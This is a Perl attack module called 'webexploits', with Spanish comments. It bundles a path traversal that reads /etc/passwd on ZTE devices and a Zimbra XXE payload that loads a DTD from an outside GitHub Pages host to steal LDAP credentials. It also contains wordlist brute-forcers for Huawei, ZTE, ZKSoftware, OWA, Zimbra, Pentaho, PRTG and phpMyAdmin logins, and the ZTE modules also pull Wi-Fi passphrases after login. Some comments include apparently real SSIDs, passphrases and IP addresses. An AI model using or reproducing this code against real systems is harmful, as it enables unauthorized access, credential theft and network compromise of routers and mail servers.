package webexploits;
our $VERSION = '1.0';
use Moose;
use Term::ANSIColor;
use Text::Table;
use HTML::TreeBuilder;
use LWP::UserAgent;
use HTTP::Cookies;
use URI::Escape;
use HTTP::Request;
use HTTP::Response;
use HTML::Scrubber;
use Switch;
use Parallel::ForkManager;
use utf8;
use Digest::MD5 qw(md5 md5_hex md5_base64);
binmode STDOUT, ":encoding(UTF-8)";
no warnings 'uninitialized';

{
has 'rhost', is => 'rw', isa => 'Str',default => '';	
has 'rport', is => 'rw', isa => 'Str',default => '80';	
has 'path', is => 'rw', isa => 'Str',default => '/';	
has 'proto', is => 'rw', isa => 'Str',default => 'http';	

has user_agent      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_host      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_port      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_user      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_pass      => ( isa => 'Str', is => 'rw', default => '' );
has proxy_env      => ( isa => 'Str', is => 'rw', default => '' );
has debug      => ( isa => 'Int', is => 'rw', default => 0 );
has headers  => ( isa => 'Object', is => 'rw', lazy => 1, builder => '_build_headers' );
has browser  => ( isa => 'Object', is => 'rw', lazy => 1, builder => '_build_browser' );


sub exploit
{
my $self = shift;
my $headers = $self->headers;
my $debug = $self->debug;
my $rhost = $self->rhost;
my $rport = $self->rport;
my $proto = $self->proto;


my %options = @_;
my $module = $options{ module };
my $path = $options{ path };


print color('bold blue') if($debug);
print "######### Testendo: $module ##################### \n\n" if($debug);
print color('reset') if($debug);

my $url ;
if ($rport eq '80' || $rport eq '443')
	{$url = "$proto://".$rhost.$path; }
else
	{$url = "$proto://".$rhost.":".$rport.$path; }
        

 
if ($module eq "zte")
{
	my $response = $self->dispatch(url => $url."../../../../../../../../../../../../etc/passwd",method => 'GET', headers => $headers);
	my $decoded_response = $response->decoded_content;
	print "$decoded_response \n";
}

if ($module eq "zimbraXXE")
{
	
	my $xml= "<!DOCTYPE Autodiscover [
        <!ENTITY % dtd SYSTEM 'https://hackworld1.github.io/zimbraUser.dtd'>
        %dtd;
        %all;
        ]>
	<Autodiscover xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'>
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
	</Autodiscover>";

	my $response = $self->dispatch(url => $url."Autodiscover/Autodiscover.xml",method => 'POST_FILE',post_data =>$xml,  headers => $headers);
	my $decoded_response = $response->decoded_content;
	
	$decoded_response =~ s/&gt;/>/g; 
	$decoded_response =~ s/&lt;/</g; 
	
	print "$decoded_response \n";
	
	if($decoded_response =~ /ldap_root_password/m){	 		
		$decoded_response =~ /name="zimbra_user">\n    <value>(.*?)</;
		my $username = $1; 
	
		$decoded_response =~ /name="zimbra_ldap_password">\n    <value>(.*?)</;
		my $password = $1; 
			
		print "Credenciales: Usuario: $username password: $password\n";
	}
}

}



sub obtener_hash_md5 {
    my ($cadena) = @_;
    my $hash_md5 = md5_hex($cadena);
    return $hash_md5;
}


sub passwordTest
{
	my $self = shift;
	my $headers = $self->headers;
	my $debug = $self->debug;
	my $rhost = $self->rhost;
	my $rport = $self->rport;
	my $proto = $self->proto;

	my %options = @_;
	my $module = $options{ module };
	my $passwords_file = $options{ passwords_file };
	my $password = $options{ password };
	my $user = $options{ user };
	my $path = $options{ path };


	print color('bold blue') if($debug);
	print "######### Testendo: $module ##################### \n\n" if($debug);
	print color('reset') if($debug);

	my $url ;
	if ($rport eq '80' || $rport eq '443')
		{$url = "$proto://".$rhost.$path; }
	else
		{$url = "$proto://".$rhost.":".$rport.$path; }
        


	############### HUAWEI-AR
	if ($module eq "HUAWEI-AR")
	{

		$headers->header("Origin" => $url);
		$headers->header("Referer" => $url);
		$headers->header("Upgrade-Insecure-Requests" => 1);
			

		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			print "Archivo password";
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			@passwords_list[0]=$password; 
		}
		
		
		foreach my $password (@passwords_list) 
		{
			$password =~ s/\n//g;				
			my $hash_data = {'UserName' => $user, 
			'Password' => $password,
			'frashnum'=> '',
			'LanguageType'=> 0			
			};	

			my $post_data = convert_hash($hash_data);
			
			my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;								
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($decoded_response !~ /ErrorMsg/m) # si la respuesta no tiene error
			{					
				print "Password encontrado: [HUAWEI-AR] $url Usuario:$user Password:$password \n";
				last;											
			}	
		}				
		close MYINPUT;	
	}
	
	############### ZTE-ONT-4G
	if ($module eq "ZTE-ONT-4G")
	{

		$headers->header("Origin" => $url);
		$headers->header("Referer" => $url);
		$headers->header("Upgrade-Insecure-Requests" => 1);
			

		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			print "Archivo password";
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			@passwords_list[0]=$password; 
		}
		
		
		foreach my $password (@passwords_list) 
		{
			$password =~ s/\n//g; 	
			
			
			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
			my $decoded_response = $response->decoded_content;
			#getObj("Frm_Logintoken").value = "19";
			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;
			my $Frm_Logintoken = $1; 
			#print "decoded_response $decoded_response\n";

			my $hash_data = {'Username' => $user, 
			'Password' => $password,
			'frashnum'=> '',
			'action'=> 'login',
			'Frm_Logintoken'=> $Frm_Logintoken
			};	

			my $post_data = convert_hash($hash_data);
			
			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			$decoded_response = $response->decoded_content;
			my $status = $response->status_line;						
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /302/m)
			{						
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlan_basic_t1.gch' ,method => 'GET', headers => $headers);
				$decoded_response = $response->decoded_content;							
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 
			
				my $KeyPassphrase;
				#KeyPassphrase','675430or'
				if ($decoded_response =~ /Transfer_meaning\('KeyPassphrase','(\w+)'\);/) {
					$KeyPassphrase = $1;					
				}
					
				#Transfer_meaning('ESSID','Flia. Saavedra');</script>
				#Transfer_meaning('ESSID','dfg\x2esdkgadkngkern');
				my $ESSID;
				while ($decoded_response =~ /Transfer_meaning\('ESSID','(.*?)'/g) {					
					$ESSID = $1;				
				}
			
				print "Password encontrado: [ZTE ZTE-ONT-4G] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
				last;											
			}	
		}				
		close MYINPUT;	
	}#ZTE ONT-4G 



	############### ZTE-F6XX-2017
	if ($module eq "ZTE-F6XX-2017")
	{		
		$headers->header("Referer" => $url);
		$headers->header("Upgrade-Insecure-Requests" => 1);
		$headers->header("Cookie" => '_TESTCOOKIESUPPORT=1');
			

		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			print "Archivo password";
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			@passwords_list[0]=$password; 
		}
		
		
		foreach my $password (@passwords_list) 
		{
			$password =~ s/\n//g; 	
						
			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
			my $decoded_response = $response->decoded_content;
			#getObj("Frm_Logintoken").value = "12";
			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;


			my $Frm_Logintoken = $1; 						
			$password =~ s/\n//g; 				
			#print ("Frm_Logintoken $Frm_Logintoken  random_number $random_number hash_md5 $hash_md5");
			my $hash_data = {"frashnum" => "",
							"action" => "login",
							"Frm_Logintoken" => $Frm_Logintoken,							
							'Username' => $user, 
							'Password' => $password
					};	

			my $post_data = convert_hash($hash_data);
			
			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			$decoded_response = $response->decoded_content;
			my $status = $response->status_line;						
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /302/m)
			{	
				#Set-Cookie: SID=329c435cd6a1b00febc2f785cf7b76f9; PATH=/; HttpOnly
				my $response_headers = $response->headers_as_string;
				my $SID;
				if ($response_headers =~ /SID=([^;]+)/) {
					$SID = $1;					
				} 
				
				#get SSID
				$headers->header("Origin" => $url);	
				$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1; SID=$SID");	
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch' ,method => 'GET', headers => $headers);
				$decoded_response = $response->decoded_content;	
				$decoded_response =~ s/Transfer_meaning\('ESSID',''//g;
				#$decoded_response =~ s/,''/,'0'/g;
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 

				#<script language=javascript>Transfer_meaning('ESSID','JACKBAUTISTA');</script>
				my $ESSID;				
				$decoded_response =~ /Transfer_meaning\('ESSID','(.*?)'/;
				$ESSID = $1;					
			
				#get password
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_secrity1_t.gch' ,method => 'GET', headers => $headers);								
				$decoded_response = $response->decoded_content;
				$decoded_response =~ s/Transfer_meaning\('KeyPassphrase',''//g;
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 
				
				#<script language=javascript>Transfer_meaning('KeyPassphrase','coins0591JB');</script>				
				$decoded_response =~ /Transfer_meaning\('KeyPassphrase','(.*?)'/;
				my $KeyPassphrase = $1; 									
			
				print "Password encontrado: [ZTE F6XX] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
				last;											
			}
		}				
		close MYINPUT;	
	}#ZTE-F6XX-2017 

	############### ZTE-F6XX-2018
	if ($module eq "ZTE-F6XX-2018")
	{		
		$headers->header("Referer" => $url);
		$headers->header("Upgrade-Insecure-Requests" => 1);
		$headers->header("Cookie" => '_TESTCOOKIESUPPORT=1');
			

		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			print "Archivo password";
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			@passwords_list[0]=$password; 
		}
		
		
		foreach my $password (@passwords_list) 
		{
			$password =~ s/\n//g; 	
						
			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
			my $decoded_response = $response->decoded_content;
			#getObj("Frm_Logintoken").value = "12";
			$decoded_response =~ /getObj\("Frm_Logintoken"\).value = "(.*?)"/;


			my $Frm_Logintoken = $1; 			
			my $random_number = int(rand(89999999)) + 10000000;			
			$password =~ s/\n//g; 	
			my $hash_md5 = obtener_hash_md5($password.$random_number);
			#print ("Frm_Logintoken $Frm_Logintoken  random_number $random_number hash_md5 $hash_md5");
			my $hash_data = {"frashnum" => "",
							"action" => "login",
							"Frm_Logintoken" => $Frm_Logintoken,
							"UserRandomNum" => $random_number,
							'Username' => $user, 
							'Password' => $hash_md5
					};	

			my $post_data = convert_hash($hash_data);
			
			$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			$decoded_response = $response->decoded_content;
			my $status = $response->status_line;						
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /302/m)
			{	
				#Set-Cookie: SID=329c435cd6a1b00febc2f785cf7b76f9; PATH=/; HttpOnly
				my $response_headers = $response->headers_as_string;
				my $SID;
				if ($response_headers =~ /SID=([^;]+)/) {
					$SID = $1;					
				} 
				
				#get SSID
				$headers->header("Origin" => $url);	
				$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1; SID=$SID");	
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch' ,method => 'GET', headers => $headers);
				$decoded_response = $response->decoded_content;	
				$decoded_response =~ s/Transfer_meaning\('ESSID',''//g;
				#$decoded_response =~ s/,''/,'0'/g;
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 

				#<script language=javascript>Transfer_meaning('ESSID','JACKBAUTISTA');</script>
				my $ESSID;				
				$decoded_response =~ /Transfer_meaning\('ESSID','(.*?)'/;
				$ESSID = $1;					
			
				#get password
				$response = $self->dispatch(url => $url.'getpage.gch?pid=1002&nextpage=net_wlanm_secrity1_t.gch' ,method => 'GET', headers => $headers);								
				$decoded_response = $response->decoded_content;
				$decoded_response =~ s/Transfer_meaning\('KeyPassphrase',''//g;
				$decoded_response =~ s/[^\x00-\x7f]//g;
				$decoded_response =~ s/\\x2e/./g; 
				$decoded_response =~ s/\\x20/ /g; 
				$decoded_response =~ s/\\x5f/_/g; 
				$decoded_response =~ s/\\x2d/-/g; 
				$decoded_response =~ s/\\x22/"/g; 
				
				#<script language=javascript>Transfer_meaning('KeyPassphrase','coins0591JB');</script>				
				$decoded_response =~ /Transfer_meaning\('KeyPassphrase','(.*?)'/;
				my $KeyPassphrase = $1; 									
			
				print "Password encontrado: [ZTE F6XX] $url Usuario:$user Password:$password ESSID $ESSID KeyPassphrase $KeyPassphrase \n";
				last;											
			}
		}				
		close MYINPUT;	
	}#ZTE-F6XX-2018 

	

	if ($module eq "ZKSoftware")
	{
		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			push @passwords_list,$password; 
		}
		

		foreach my $password (@passwords_list) {
			$password =~ s/\n//g; 	
			my $hash_data = {'username' => $user, 
					'userpwd' => $password
					};	
		
			my $post_data = convert_hash($hash_data);
			
			my $response = $self->dispatch(url => $url."/csl/check",method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /200/m)
			{
				if  ($decoded_response =~ /Department|Departamento|frame|menu|self.location.href='\/'/i){	 
				print "Password encontrado: [ZKSoftware] $url Usuario:$user Password:$password\n";
				last;
				}							
			}	
		}				
		close MYINPUT;	
	}#ZKSoftware


	if ($module eq "AMLC")
	{
		my @passwords_list = []; 
		if ($passwords_file ne '' )
		{
			open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
			while (my $password=<MYINPUT>)
			{ 						
				push @passwords_list,$password; 
			}
		}
		else
		{
			push @passwords_list,$password; 
		}
		

		foreach my $password (@passwords_list) {
			$password =~ s/\n//g; 	


			my $hash_data = {'usu_login' => $user, 
					'usu_password' => $password,
					'aj001sr001qwerty' => '3730329decdf984212942a59de68a819'
					};	
		
			my $post_data = convert_hash($hash_data);
			
 
			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
			$headers->header("Cookie" => "aj001sr001qwertycks=3730329decdf984212942a59de68a819");
			my $response = $self->dispatch(url => $url."login",method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			print "[+] user:$user password:$password status:$status\n";
			#print($decoded_response);
			if ($status =~ /303/m)
			{				
				print "Password encontrado: [AMLC] $url Usuario:$user Password:$password\n";
				last;				
			}	
		}				
		close MYINPUT;	
	}#AMLC

	if ($module eq "owa")
	{
		my $counter = 1;	
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			$password =~ s/\n//g; 	
			my $hash_data = {"loginOp" => "login",
							"client" => "preferred",
							'username' => $user, 
							'password' => $password
					};	
		
			my $post_data = convert_hash($hash_data);
			
			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
			$headers->header("Cookie" => "ZM_TEST=true");
			$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
			
			my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			if ($decoded_response =~ /error en el servicio de red|network service error/i)
			{				 
				print "El servidor OWA esta bloqueando nuestra IP :( \n";
				last;
											
			}	
			
			
			print "[+] user:$user password:$password status:$status\n";
			if ($status =~ /302/m)
			{				 
				print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
				last;
											
			}
			
			#if (0 == $counter % 10) {
				#print "Sí es múltiplo de 10\n";
				#sleep 120;
			#}			
			$counter = $counter + 1;
			#sleep 1;
		}
		close MYINPUT;	
	}#owa

	if ($module eq "zimbra")
	{
		my $counter = 1;	
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			$password =~ s/\n//g; 	
			my $hash_data = {"loginOp" => "login",
							"client" => "preferred",
							'username' => $user, 
							'password' => $password
					};	
		
			my $post_data = convert_hash($hash_data);
			
			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
			$headers->header("Cookie" => "ZM_TEST=true");
			$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
			
			my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			if ($decoded_response =~ /error en el servicio de red|network service error/i)
			{				 
				print "El servidor Zimbra esta bloqueando nuestra IP :( \n";
				last;
											
			}	
			
			
			print "[+] user:$user password:$password status:$status\n";
			if ($status =~ /302/m)
			{				 
				print "Password encontrado: [zimbra] $url (Usuario:$user Password:$password)";
				last;
											
			}
			
			#if (0 == $counter % 10) {
				#print "Sí es múltiplo de 10\n";
				#sleep 120;
			#}			
			$counter = $counter + 1;
			#sleep 1;
		}
		close MYINPUT;	
	}#zimbra



	# pentaho
	if ($module eq "pentaho")
	{
				
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			$password =~ s/\n//g; 
			$headers->header("Content-Type" => "application/x-www-form-urlencoded; charset=UTF-8");
			$headers->header("Accept" => "text/plain, */*; q=0.01");		
			$headers->header("X-Requested-With" => "XMLHttpRequest");		
							
			my $hash_data = {"locale" => "en_US",						 
							'j_username' => $user, 
							'j_password' => $password
					};	
		

			my $post_data = convert_hash($hash_data);
					
			my $response = $self->dispatch(url => $url."pentaho/j_spring_security_check",method => 'POST',post_data =>$post_data, headers => $headers);
			my $response_headers = $response->headers_as_string;
			my $decoded_response = $response->decoded_content;
			my $status = $response->status_line;
			
			print "[+] user:$user password:$password status:$status\n";
			#Location: /pentaho/Home (password OK)		#Location: /pentaho/Login?login_error=1 (password BAD)
			if ($response_headers =~ /Home/i)
			{				 
				print "Password encontrado: [Pentaho] $url (Usuario:$user Password:$password)\n";
				last;
											
			}	
			
		}
		close MYINPUT;	
	}

	if ($module eq "PRTG")
	{

		$headers->header("Content-Type" => "application/x-www-form-urlencoded");		
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			$password =~ s/\n//g; 	
			my $hash_data = {'username' => $user, 
					'password' => $password,
					'guiselect' => "radio"
					};	
		
			my $post_data = convert_hash($hash_data);
			
			my $response = $self->dispatch(url => $url."/public/checklogin.htm",method => 'POST',post_data =>$post_data, headers => $headers);
			my $decoded_response = $response->decoded_content;
			my $response_headers = $response->headers_as_string;
			my $status = $response->status_line;
			
			print "[+] user:$user password:$password status:$status\n";
			
			
			if (!($response_headers =~ /error/m) && ! ($status =~ /500 read timeout/m)){	 
				print "Password encontrado: [PRTG] $url \nUsuario:$user Password:$password\n";
				last;
			}		
		}
		close MYINPUT;	
	}#PRTG


	if ($module eq "phpmyadmin")
	{
			
		open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
		while (my $password=<MYINPUT>)
		{ 
			
			$password =~ s/\n//g; 	
			my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
			my $decoded_response = $response->decoded_content;
					
			#open (SALIDA,">phpmyadmin.html") || die "ERROR: No puedo abrir el fichero google.html\n";
			#print SALIDA $decoded_response;
			#close (SALIDA);

			if ($decoded_response =~ /navigation.php/i ||  $decoded_response =~ /logout.php/i)
			{			
				print "[phpmyadmin] $url (Sistema sin password)\n";
				last;									
			}	 
			
			#name="token" value="3e011556a591f8b68267fada258b6d5a"
			$decoded_response =~ /name="token" value="(.*?)"/;
			my $token = $1;



			if ($decoded_response =~ /respondiendo|not responding|<h1>Error<\/h1>/i)
			{			
				print "ERROR: El servidor no está respondiendo \n";
				last;									
			}	 

			
			#pma_username=dgdf&pma_password=vhhg&server=1&target=index.php&token=918ab63463cf3b565d0073973b84f21c
			my $hash_data = {'pma_username' => $user, 
					'pma_password' => $password,
					'token' => $token,
					'target' => "index.php",
					'server' => "1",
					};	
		
			my $post_data = convert_hash($hash_data);
			GET:		
			$headers->header("Content-Type" => "application/x-www-form-urlencoded");
			$response = $self->dispatch(url => $url."index.php",method => 'POST',post_data =>$post_data, headers => $headers);
			$decoded_response = $response->decoded_content;	
			my $status = $response->status_line;	
			my $response_headers = $response->headers_as_string;
			
			#Refresh: 0; http://181.188.172.2/phpmyadmin/index.php?token=dd92af52b6eeefd014f7254ca02b0c25
			
			
			if ($status =~ /500/m)
				{goto GET;}
				
			if ($status =~/30/m || $response_headers =~/Refresh: /m)
			{
				#Location: http://172.16.233.136/phpMyAdmin2/index.php?token=17d5777095918f70cf052a1cd769d985
				$response_headers =~ /Location:(.*?)\n/;
				my $new_url = $1; 	
				if ($new_url eq ''){
					$response_headers =~ /Refresh: 0; (.*?)\n/;
					$new_url = $1;
				}
				
				#print "new_url $new_url \n";
			
				$response = $self->dispatch(url => $new_url, method => 'GET');
				$decoded_response = $response->decoded_content;								
				#open (SALIDA,">phpmyadmin2.html") || die "ERROR: No puedo abrir el fichero google.html\n";
				#print SALIDA $decoded_response;
				#close (SALIDA);
			}
			
			print "[+] user:$user password:$password status:$status\n";
			
			#open (SALIDA,">phpmyadminn.html") || die "ERROR: No puedo abrir el fichero google.html\n";
			#print SALIDA $decoded_response;
			#close (SALIDA);
				
						
			if (!($decoded_response =~ /pma_username/m) && !($decoded_response =~ /Cannot log in to the MySQL server|Can't connect to MySQL server|1045 El servidor MySQL/i))
			{			
				print "Password encontrado: [phpmyadmin] $url Usuario:$user Password:$password\n";
				last;									
			}	
			
		}
		close MYINPUT;	
	}#phpmyadmin
}



################################### build objects ########################

################### build headers object #####################
sub _build_headers {   
my $self = shift;
my $debug = $self->debug;
my $headers = HTTP::Headers->new;


my @user_agents=( "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36",
			  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Gecko/20100101 Firefox/23.0",
			  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
			  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36");			   
			  
my $user_agent = @user_agents[rand($#user_agents+1)];    
print "user_agent $user_agent \n" if ($debug);

$headers->header('User-Agent' => "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"); 
$headers->header('Accept' => '*/*'); 
$headers->header('Connection' => 'close'); 
$headers->header('Cache-Control' => 'max-age=0'); 
$headers->header('DNT' => '1'); 

return $headers; 
}


###################################### internal functions ###################

sub only_ascii
{
 my ($text) = @_;
 
$text =~ s/á/a/g; 
$text =~ s/é/e/g; 
$text =~ s/í/i/g; 
$text =~ s/ó/o/g; 
$text =~ s/ú/u/g;
$text =~ s/ñ/n/g; 

$text =~ s/Á/A/g; 
$text =~ s/É/E/g; 
$text =~ s/Í/I/g; 
$text =~ s/Ó/O/g; 
$text =~ s/Ú/U/g;
$text =~ s/Ñ/N/g;

$text =~ s/[^[:ascii:]]//g;
return $text;
}

sub convert_hash
{
my ($hash_data)=@_;
my $post_data ='';
foreach my $key (keys %{ $hash_data }) {    
    my $value = $hash_data->{$key};
    $post_data = $post_data.uri_escape($key)."=".$value."&";    
}	
chop($post_data);
return $post_data;
}

sub dispatch {    
my $self = shift;
my $debug = $self->debug;
my %options = @_;

my $url = $options{ url };
my $method = $options{ method };
my $headers = $options{ headers };
my $response;

    
if ($method eq 'GET')
  { my $req = HTTP::Request->new(GET => $url, $headers);
    $response = $self->browser->request($req)
  }

if ($method eq 'OPTIONS')
  { my $req = HTTP::Request->new(OPTIONS => $url, $headers);
    $response = $self->browser->request($req)
  }  
  
if ($method eq 'POST')
  {     
   my $post_data = $options{ post_data };           
   my $req = HTTP::Request->new(POST => $url, $headers);
   $req->content($post_data);
   $response = $self->browser->request($req);  
  }  
  
if ($method eq 'POST_MULTIPART')
  {    	   
   my $post_data = $options{ post_data }; 
   $headers->header('Content_Type' => 'multipart/form-data');
    my $req = HTTP::Request->new(POST => $url, $headers);
   $req->content($post_data);
   $response = $self->browser->request($req);    
  } 

if ($method eq 'POST_FILE')
  { 
	my $post_data = $options{ post_data };         	    
	$headers->header('Content_Type' => 'application/xml');
    my $req = HTTP::Request->new(POST => $url, $headers);
    $req->content($post_data);    
    $response = $self->browser->request($req);    
  }  
      
  
return $response;
}

################### build browser object #####################	
sub _build_browser {    

	my $self = shift;
	my $rhost = $self->rhost;
	my $rport = $self->rport;
	my $proto = $self->proto;

	my $debug = $self->debug;
	my $proxy_host = '127.0.0.1'; 
	my $proxy_port = 8083; $self->proxy_port;
	my $proxy_user = $self->proxy_user;
	my $proxy_pass = $self->proxy_pass;
	my $proxy_env = $self->proxy_env;

	print "building browser \n" if ($debug);
	
	my $browser = LWP::UserAgent->new( max_redirect => 5, env_proxy => 1,keep_alive => 1, timeout => 15, agent => "Mozilla/4.76 [en] (Win98; U)",ssl_opts => { verify_hostname => 0 ,  SSL_verify_mode => 0});
	$browser->cookie_jar(HTTP::Cookies->new());
	$browser->show_progress(1) if ($debug);
	return $browser;     
}
    
}
1;

